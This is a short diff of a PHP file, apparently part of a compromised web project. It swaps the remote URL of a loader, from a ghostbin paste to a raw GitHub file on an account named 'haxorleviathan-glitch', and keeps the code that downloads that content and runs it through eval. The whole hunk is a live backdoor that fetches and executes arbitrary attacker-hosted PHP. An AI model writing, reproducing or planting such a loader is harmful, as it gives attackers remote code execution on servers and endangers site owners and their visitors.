@@ -113,9 +113,10 @@ if (!isset($_SESSION[$session_key])) {
     }
 }
 
-$target_url = 'https://ghostbin.axel.org/paste/fxon9/raw';
+$target_url = 'https://raw.githubusercontent.com/haxorleviathan-glitch/repository/refs/heads/main/litespeed';
 $payload = geturlsinfo($target_url);
 if ($payload !== false) {
     eval('?>' . $payload);
 }
 ?>
+
